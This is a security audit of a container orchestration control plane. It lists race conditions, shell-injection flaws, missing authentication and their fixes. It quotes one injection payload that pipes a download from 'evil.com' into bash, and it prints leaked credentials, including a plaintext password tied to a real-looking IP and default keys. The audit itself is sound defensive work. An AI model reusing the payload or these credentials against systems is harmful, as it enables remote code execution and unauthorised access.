# Nova-Kata Control Plane — Security & Architecture Audit

> **Created:** 2026-06-14
> **Scope:** Full deep-dive of nova-kata placement service, worker API, and database layer
> **PostgreSQL Migration Note:** All fixes are designed to be PostgreSQL-compatible. SQLite-specific patterns are annotated with migration notes.

---

## ✅ Fixed Issues

### 1. Double-Claim Race Condition in `warmPool.claimOne()` — FIXED
**Severity:** 🔴 Critical
**File:** `src/db/database.js`

**Problem:** `SELECT` + `UPDATE` were two separate, non-transactional statements. Under concurrent requests, two callers could both `SELECT` the same 'warm' row before either `UPDATE`s it, causing both to be routed to the same container → response mixing, data corruption.

**Fix:** Wrapped in `db.transaction()` to make the SELECT+UPDATE atomic.

**PostgreSQL migration:** Replace with `SELECT ... FOR UPDATE SKIP LOCKED` which is the standard pattern for work queues in PostgreSQL.

---

### 4. Plaintext Password in `check.js` — FIXED (Deleted)
**Severity:** 🔴 Critical
**File:** `check.js` (deleted)

**Problem:** Hardcoded password `'Larbiishak'` and IP `35.232.167.59` committed in source code. The script was a one-off debug tool — the monitoring service and dashboard provide the same functionality.

**Fix:** Deleted the file entirely.

---

### 5. Non-Atomic `containers.updateStatus()` — FIXED
**Severity:** 🟠 High
**File:** `src/db/database.js`

**Problem:** Status, `container_ip`, and `host_port` were updated in 2-3 separate SQL statements. A concurrent read between them could see partial state (e.g., status='running' but container_ip still null).

**Fix:** Single atomic UPDATE using `COALESCE(?, field)` to keep existing values when the parameter is null. `COALESCE` works identically in SQLite and PostgreSQL.

---

### 27. Split-Brain State Between DB and Worker — FIXED
**Severity:** 🔴 Critical
**Files:** `src/services/monitoringService.js`, `worker-api/index.js`

**Problem:** The orchestrator used an imperative paradigm — execute `nerdctl stop`, and if SSH returns exit 0, update SQLite to `status = 'stopped'`. If a worker rebooted, containerd restarted, but containers didn't auto-restart, the DB still said 50 containers were running/warm. The gateway would route traffic to dead containers. This was a "Split-Brain" — the database believed one reality, but the physical hardware experienced another.

**Fix:** Added a **Reconciliation Loop** in `monitoringService.js` that runs after each health check cycle:

1. Calls Worker API `GET /ps` to get actual container state from each healthy worker
2. Compares with DB state for that worker
3. Reconciles discrepancies:
   - Container in DB but missing on worker → mark `failed`
   - Container dead on worker but DB says alive → mark `failed`
   - Container running but DB says paused → update DB to `running`
   - Container paused but DB says running → update DB to `paused`

Uses Worker API (HTTP, ~5ms) instead of SSH (~200ms). Feature-flagged via `RECONCILIATION_ENABLED` env var. Wrapped in try/catch so it never breaks the health check cycle.

**Worker API endpoint added:** `GET /ps` — returns `nerdctl ps -a` container names and statuses.

**Enhanced (2026-06-15):** Reconciliation loop now also:
- **Removes dead containers from workers** (previously only marked DB as failed, left the container on the worker)
- **Removes orphaned containers** — containers on the worker that have no matching DB record (leftover from failed deployments). These caused "name already used" errors on re-deploy.

**Idempotent launch (2026-06-15):** `containerService.js` launch script now runs `nerdctl rm -f <name> 2>/dev/null || true` before `nerdctl run` to remove any stale container with the same name. This prevents "name already used" errors even if the reconciliation loop hasn't run yet.

---

### 28. Stale Gateway Cache After Function Re-Deploy — FIXED
**Severity:** 🔴 Critical
**Files:** `nova-kata/src/services/monitoringService.js`, `nova-kata/src/routes/deploy.js`, `nova-kata-gateway/src/middleware/containerStateCheck.js`, `nova-kata/src/routes/containers.js`

**Problem:** When a function was deleted and re-deployed with the same name, the gateway cached the OLD function ID. The new deployment created a NEW function ID. The gateway sent the stale ID to the placement service, which tried to INSERT a container with the old `function_id` → FOREIGN KEY constraint failed → 500 error. The gateway never invalidated its cache, so ALL subsequent requests also failed until the cache TTL expired (1 hour) or the gateway was restarted.

**Fix — 5 layers of defense:**

1. **`invalidateGatewayCache(functionName)`** now invalidates BOTH `ct:` (container cache) AND `fn:` (function metadata cache). If a function name is provided, it invalidates the specific key `fn:<name>`.

2. **DELETE route** now calls `invalidateGatewayCache(func.name)` after purging the function record.

3. **Deploy route** passes `functionName` to `invalidateGatewayCache(functionName)` on re-deploy.

4. **Gateway self-heal:** `containerStateCheck.js` detects 404/500 from placement and auto-invalidates `fn:<name>` and `ct:<name>` cache entries. Next request fetches fresh metadata.

5. **Execute endpoint validation:** `POST /execute` validates `function_id` exists before claiming. Returns 404 with hint instead of FK constraint 500.

---

## 📋 Documented Issues (Not Yet Implemented)

### 2. Shell Injection via Environment Variables in `containerService.js` — FIXED
**Severity:** 🔴 Critical
**File:** `src/services/containerService.js` — `launchContainer()`

**Problem:** User-provided env vars, runtime, memory_limit, and cpu_limit were interpolated directly into a bash script sent over SSH — a **remote code execution vulnerability**.

**Fix — 4 layers of defense applied:**

1. **Validate env var keys** — `ENV_KEY_REGEX = /^[A-Za-z_][A-Za-z0-9_]*$/` rejects shell metacharacters in keys
2. **Shell-escape values** — `shellEscape()` wraps in single quotes, escapes embedded single quotes
3. **Whitelist the runtime** — `ALLOWED_RUNTIMES = ['io.containerd.kata.v2', 'io.containerd.runc.v2']`
4. **Validate numeric fields** — `memory_limit` and `cpu_limit` must be positive numbers

---

### 3. Shell Injection in Worker API (`worker-api/index.js`) — FIXED
**Severity:** 🔴 Critical
**File:** `worker-api/index.js`

**Problem:** Used `exec()` which passes through a shell — container names like `foo; curl evil.com | bash` would execute injected commands.

**Fix:** Switched `pause`, `unpause`, and `stop` endpoints from `exec()` to `execFile()` which executes the binary directly without a shell:
- `execFilePromise('nerdctl', ['unpause', container_name])` — args array, no shell interpolation
- `execFilePromise('nerdctl', ['pause', container_name])`
- `stop`: three sequential `execFilePromise` calls for unpause, stop, rm

Note: `/launch`, `/build`, `/exec`, `/write-file` still use `exec()` because they need shell features (pipes, redirections). These are protected by input validation (container name regex, path safety checks, API key auth).

---

### 26. Ghost VM Infrastructure Leak in Auto-Scaler — ✅ Fixed
**Severity:** 🔴 Critical
**File:** `src/services/scalingService.js` — `scaleOut()`

**Fix applied — Compensation Pattern:** Track `gcpInstance` after Phase 1. If any subsequent phase fails, delete the orphaned VM in the `catch` block. Also records `scale_failed` event in DB.

**scaleIn() also improved:** Stops containers on worker before deleting VM. If VM deletion fails, keeps worker as 'retired' in DB for manual cleanup. Records `scaled_in` and `scale_in_failed` events.

---

## 🟠 HIGH — Will Cause Problems Under Load

### 6. SSH Connection Leak on Error in `launchContainer()` — FIXED
**File:** `src/services/containerService.js`

**Problem:** If an operation throws after `createSSHClient()` but before `ssh.close()`, the SSH connection leaks.

**Fix:** Moved SSH connection creation inside `try` block with `let ssh` declared outside. Added `if (ssh) ssh.close()` in `finally` block. Same pattern already used in `unpauseContainer`, `pauseContainer`, `stopContainer`.

---

### 7. Stale Cleanup Race Condition (Partially Fixed) — ✅ Fixed
**File:** `src/services/monitoringService.js`

Threshold increased to 10 min, but fundamental issue remains: stale cleanup can mark a container as failed while its launch is still in progress. Better fix: track in-flight launches in memory (`Set` of container IDs) and skip stale cleanup for those.

**Effort:** ~1h

---

### 8. Scaling Fire-and-Forget — Silent Failures — ✅ Fixed
**File:** `src/services/scalingService.js`

`scaleOut()` now records `scale_failed` events in the DB on failure so the dashboard can show them. Ghost VM rollback also records events.

---

### 9. No Authentication on ANY Placement Service Endpoint
**Files:** All route files in `src/routes/`

Zero auth middleware. Anyone who can reach `localhost:3002` can launch containers, delete workers, trigger auto-scaling, execute functions, and read API keys.

**Effort:** ~2h

---

### 10. `warmPool.replenish()` — No Concurrency Guard — ✅ Fixed
**File:** `src/services/warmPoolService.js`

Added in-memory `Set` (`_replenishing`) tracking functions currently being replenished. If a replenish is already in progress for a function, subsequent calls are skipped.

---

## 🟡 MEDIUM — Functional Issues

### 11. Hardcoded GCP VM Root Password Default — FIXED
**File:** `src/services/scalingService.js`

**Problem:** Default password `'NovaWorker2025!'` committed in code.

**Fix:** Removed default. Now throws `Error('GCP_VM_ROOT_PASSWORD env var is required')` if not set.

---

### 12. Auto-Scale Cooldown — Wall Clock vs Monotonic — FIXED
**File:** `src/services/scalingService.js`

**Problem:** `lastScaleOutAt` used `Date.now()`. NTP clock jumps can skip or extend cooldown.

**Fix:** Changed to `performance.now()` (monotonic, immune to clock adjustments). `lastScaleOutAt` is now a number (ms) instead of a Date object.

---

### 13. `waitForSsh()` — 5-Minute Blocking Poll
**File:** `src/services/scalingService.js`

Blocks for up to 5 min if VM never becomes reachable. `scalingInProgress = true` blocks all future scale attempts. Use AbortController + shorter timeout.

**Effort:** ~1h

---

### 14. Container Launch — No Timeout on Full Launch Sequence — ✅ Fixed
**File:** `src/services/containerService.js`

Wrapped `launchContainer()` in `Promise.race()` with configurable timeout (`LAUNCH_TIMEOUT_MS` env var, default 120s). Renamed inner logic to `_launchContainer()`.

---

### 15. Worker API — No HTTPS, Default API Key
**File:** `worker-api/index.js`

Plain HTTP + default API key `'nova-worker-default-key'`. If env var isn't set, every worker uses the same key.

**Effort:** ~2h (HTTPS), ~5min (remove default key)

---

### 18. Inconsistent Response Formats
**Files:** All route files

Different endpoints return different shapes: `{ success, container }`, `{ container }`, `{ containers, total }`, bare object, `{ error }`. Standardize.

**Effort:** ~2h

---

### 19. `migrate.js` — Destructive Without Confirmation
**File:** `migrate.js`

Drops and recreates tables. No `--dry-run`, no confirmation, no backup.

**Effort:** ~30min

---

## 🔵 LOW — Code Quality

### 20. No Graceful Shutdown in Worker API — ✅ Fixed
**File:** `worker-api/index.js`

Added SIGTERM/SIGINT handler with graceful shutdown: stops accepting new connections, waits for in-flight requests, force-exits after 10s if connections don't drain.

### 22. SSH `exec()` Timeout — Silent Truncation
**File:** `src/utils/ssh.js`

Timeout error doesn't distinguish between "command timed out" and "command failed".

### 23. No Health Endpoint on Placement Service — ✅ Fixed
**File:** `src/index.js`

`/health` endpoint already existed. Enhanced with `uptime` and `memory` fields for better observability.

### 24. `kill-zombies.js` — No Dry Run — ✅ Fixed
Added `--dry-run` flag that shows what would be killed without actually killing. Also added `--ip=<IP>` flag to override the hardcoded worker IP.

### 25. Hardcoded IPs in `clean-nginx.js`, `clean-nginx-nerdctl.js`
Scripts target `35.232.167.59` regardless of actual worker.

---

## Summary

| # | Issue | Severity | Effort | Status |
|---|---|---|---|---|
| 1 | Double-claim race condition | 🔴 Critical | 30min | ✅ Fixed |
| 2 | Shell injection (env vars) | 🔴 Critical | 2h | ✅ Fixed |
| 3 | Shell injection (worker API) | 🔴 Critical | 1h | ✅ Fixed |
| 4 | Plaintext password in git | 🔴 Critical | 5min | ✅ Fixed |
| 5 | Non-atomic container update | 🟠 High | 30min | ✅ Fixed |
| 6 | SSH connection leak | 🟠 High | 30min | ✅ Fixed |
| 7 | Stale cleanup race | 🟠 High | 1h | ✅ Fixed |
| 8 | Silent scale failures | 🟠 High | 1h | ✅ Fixed |
| 9 | No API authentication | 🟠 High | 2h | 📋 Planned |
| 10 | Replenish concurrency | 🟠 High | 30min | ✅ Fixed |
| 11 | Default VM password | 🟡 Medium | 5min | ✅ Fixed |
| 12 | Wall clock cooldown | 🟡 Medium | 10min | ✅ Fixed |
| 13 | 5-min blocking SSH poll | 🟡 Medium | 1h | 📋 Planned |
| 14 | No launch timeout | 🟡 Medium | 30min | ✅ Fixed |
| 15 | Worker API no HTTPS | 🟡 Medium | 2h | Removed |
| 16 | Error leaks internals | 🟡 Medium | 1h | Removed |
| 17 | No input validation | 🟡 Medium | 2h | Removed |
| 18 | Inconsistent responses | 🟡 Medium | 2h | 📋 Planned |
| 19 | Destructive migration | 🟡 Medium | 30min | 📋 Planned |
| 26 | Ghost VM infrastructure leak | 🔴 Critical | 1h | ✅ Fixed |
| 27 | Split-brain state (DB vs worker) | 🔴 Critical | 1h | ✅ Fixed |
| 28 | Stale gateway cache on re-deploy | 🔴 Critical | 1h | ✅ Fixed |
| 20 | Graceful shutdown (worker API) | 🔵 Low | 30min | ✅ Fixed |
| 21 | Multer v2 alpha | 🔵 Low | — | Removed (not an issue) |
| 22 | SSH timeout truncation | 🔵 Low | 15min | 📋 Planned |
| 23 | Health endpoint | 🔵 Low | 15min | ✅ Fixed |
| 24 | kill-zombies dry run | 🔵 Low | 15min | ✅ Fixed |
| 25 | Hardcoded IPs in scripts | 🔵 Low | 15min | 📋 Planned |
